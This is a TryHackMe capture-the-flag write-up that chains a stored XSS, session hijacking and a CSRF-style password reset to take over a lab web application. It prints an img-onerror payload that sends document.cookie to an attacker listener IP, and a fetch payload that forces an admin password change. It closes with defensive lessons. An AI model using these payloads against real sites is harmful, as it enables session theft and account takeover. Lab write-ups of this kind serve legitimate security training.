# 🛠️ TryHackMe: What's Your Name?  
**Difficulty:** 🟠 Medium  

![Room Badge](https://tryhackme-badges.s3.amazonaws.com/manio11.png)

🔗 [View the room on TryHackMe](https://tryhackme.com/room/whatsyourname)

> **Disclaimer:**  
> This write-up is part of my professional offensive security portfolio.  
> All testing was performed on the authorized TryHackMe environment.  
> No techniques described here were executed against real systems.

## 🧠 Summary
**What’s Your Name?** is a web exploitation lab focused on identifying and chaining client-side weaknesses to escalate privileges.  
The exploitation path revolves around:

- Recon & port enumeration  
- Stored XSS → cookie exfiltration  
- Forced privilege actions via CSRF-like exploitation  
- Server-side misconfiguration abuse  
- Escalation from user → moderator → admin  

The room demonstrates how *low-severity client-side bugs* can quickly escalate into *full account takeover* when combined.

---

## 🧰 Tools & Techniques

| Tool / Technique | Purpose |
|------------------|---------|
| **nmap** | Service discovery & port enumeration |
| **Browser DevTools** | Payload testing, cookie manipulation |
| **XSS payloads** | Session hijacking via cookie exfiltration |
| **CSRF-like JavaScript abuse** | Forcing authenticated POST requests |
| **Netcat / simple HTTP listeners** | Receiving exfiltrated cookies |

---

## 🚀 Attack Path

## 1. 🔎 Portscan & Service Reconnaissance

```bash
nmap -T4 -p- -sC -sV worldwap.thm -Pn -n
```

- 22/tcp — OpenSSH 8.2p1
- 80/tcp — Apache 2.4.41
- 8081/tcp — Apache 2.4.41

The main application lives under:
```ruby
http://worldwap.thm/public/html/
```

---

## 2. 💣 Initial XSS Payload — Cookie Exfiltration

### Why the XSS Worked

The “full name” field is rendered directly into the DOM without any output encoding.  
Additionally, the application does not apply the following protections:

- No `HttpOnly` flag on `PHPSESSID` → allows JavaScript access  
- No `SameSite` attribute → browser freely forwards cookies to external requests  
- No input sanitization or HTML stripping  

These missing controls allowed a simple `<img onerror>` payload to execute inside the moderator’s browser when they viewed the profile.
```html
<img src=x onerror="window.location='http://10.10.181.194:4444?'+document.cookie;">
```

A netcat listener captured the incoming request and leaked session cookie:
```bash
PHPSESSID=7a98fnm746ectvvnh816ttmk27
```
This session cookie belonged to a moderator account.

---

## 3. 🔁 Session Hijacking — Moderator Access

With the stolen `PHPSESSID` obtained via the XSS payload, the next step was to impersonate the moderator account.

To do this, the session cookie was replaced inside the browser:

1. Open **DevTools** → **Application** → **Cookies**  
2. Locate the `PHPSESSID` entry  
3. Replace its value with the exfiltrated session ID  
4. Refresh the page at:
```bash
login.worldwap.thm/login.php
```
The session remained valid because the application does not rotate the session ID after login. This allowed re-use of a moderator's active PHPSESSID without triggering any invalidation or IP/user-agent checks.

After refreshing, the application authenticated the session as a **moderator**, granting elevated dashboard access.

The first flag obtained:
```text
REDACTED
```

This confirms that the platform lacked proper session protections such as:
- HttpOnly session cookie flags  
- IP/session binding  
- Regeneration of session IDs upon login  

---

## 4. 🧩 Investigating the Platform for Admin Privileges

After gaining moderator access, the next objective was to escalate privileges to the **administrator** account.

The moderator dashboard exposed a **Change Password** feature, but attempts to modify administrator credentials were blocked:

- The server enforced role-based restrictions  
- Only administrators were allowed to update admin passwords  
- Moderator privileges were insufficient for direct escalation  

This indicated the need for an **indirect privilege-escalation vector**, likely by abusing:

- client-side logic,
- insecure backend endpoints,
- or missing authorization checks behind the scenes.

Further investigation of the platform and its interactive features revealed an opportunity for escalation through the site’s chatbot mechanism.

---

## 5. 🤖 CSRF-Style Exploitation via Chatbot Functionality

The application included a chatbot feature that processed user-supplied content.  
Although designed as a message interface, the chatbot failed to sanitize input and executed HTML/JavaScript within the user context.

This made it possible to abuse the chatbot to perform **authenticated actions** on behalf of the currently logged-in user.

Using the same `img onerror` approach as before, a crafted payload was sent through the chatbot to force the browser to submit a privileged POST request to an internal endpoint on port `8081`:

### How the vulnerable endpoint was discovered
By browsing the internal links available in the moderator dashboard, an iframe and several AJAX calls referenced port **8081**, which exposes an administrative backend. One of the files, **/change_password.php**, accepts POST requests without verifying the user's role.

### Why the chatbot executes JavaScript
Messages in the chatbot are rendered using `innerHTML`, meaning user input is inserted directly into the DOM. This converts any HTML or script-based payloads into live, executable browser content.

### Why the forced request succeeds
The backend only checks whether the request contains a valid PHP session cookie, not whether the user is an administrator. This makes the endpoint vulnerable to CSRF-style request forgery.

```html
<img src="x" onerror="
  fetch('http://worldwap.thm:8081/change_password.php', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'new_password=admin123'
  });
">
```

**Why this works:**
-The browser is **already authenticated,** and `credentials: 'include'` forwards the moderator’s cookies automatically.
-The internal endpoint `(change_password.php)` trusts any authenticated POST request.
-No CSRF tokens or server-side validation were implemented.
-The chatbot served as an unintentional **JavaScript execution vector.**

**The result:**
The administrator password was successfully changed **without direct access** to the admin interface.

This created the perfect privilege-escalation route toward full administrative control of the platform.

---

## 6. 🔑 Gaining Administrative Access — Flag #2

With the administrator password forcefully reset via the CSRF-style payload, logging into the admin panel became straightforward.

**The new forced credentials:**
- username: admin
- password: admin123

**Navigating to the login interface:**
```bash
http://login.worldwap.thm/login.php
```

After authentication, full administrative privileges were granted, exposing the second flag:
```text
REDACTED
```

---

## 🏁 Flags Obtained

| Flag          | Vector                              | Value         |
| ------------- | ----------------------------------- | ------------- |
| **Moderator** | XSS → session cookie exfiltration   | `REDACTED`   |
| **Admin**     | Forced POST (CSRF-like) via chatbot | `REDACTED` |

---

## Room links

📸 [screenshots](../../challenges/thm-whats-your-name?/screenshots.md)

🔗 [TryHackMe - El bandito](https://tryhackme.com/room/whatsyourname)

---

## 💭 Reflection

This room demonstrated how seemingly simple web vulnerabilities can escalate into a full compromise when chained together with weak session controls and missing server-side validation.  
What initially appeared to be a basic stored XSS issue evolved into a multi-stage attack path that mirrors real-world failures in access control and session handling.

The challenge highlighted several critical mechanics:

- **Stored XSS enabling credential/session exfiltration.**
- **Weak session management**, allowing hijacking with nothing more than a stolen cookie.
- **A chatbot that executed arbitrary HTML/JS**, providing an alternative injection vector.
- **CSRF-style privilege escalation** against backend endpoints that performed no authorization checks.

The power of this room comes from how these flaws interacted.  
Individually, each vulnerability was moderate. Combined, they enabled full administrative control.

---

### Key Takeaways

- **Persistent XSS remains one of the most dangerous web vulnerabilities**, especially when session cookies lack security flags such as `HttpOnly`.
- **Role-based access controls must be enforced on the server**, not only in the UI.  
  If backend endpoints trust any authenticated request, privilege boundaries collapse instantly.
- **User-facing features like chatbots must sanitize input thoroughly**, since they often run with the same privileges as the user viewing them.
- **CSRF protections (tokens, Origin checks, SameSite settings)** are essential to prevent browsers from being weaponized against themselves.

---

### Lessons Learned

- **Session cookies must be protected with `HttpOnly`, `Secure`, and ideally `SameSite` attributes**.  
  Without them, any XSS becomes a direct session takeover.
- **Every privileged action should include proper authorization checks**, regardless of which endpoint receives the request.
- **Never trust browser-initiated actions** — they can be forged, automated, or executed through hidden vectors such as injected images or scripts.
- **Defense-in-depth is the only reliable approach**: even if XSS is overlooked, strong session management and server-side access controls can still mitigate major impact.

This room reinforces how attackers often exploit not a single vulnerability, but the **intersections** between them.  
Modern web security relies on consistent validation across layers — and when even one link is weak, the entire chain becomes an attack surface.

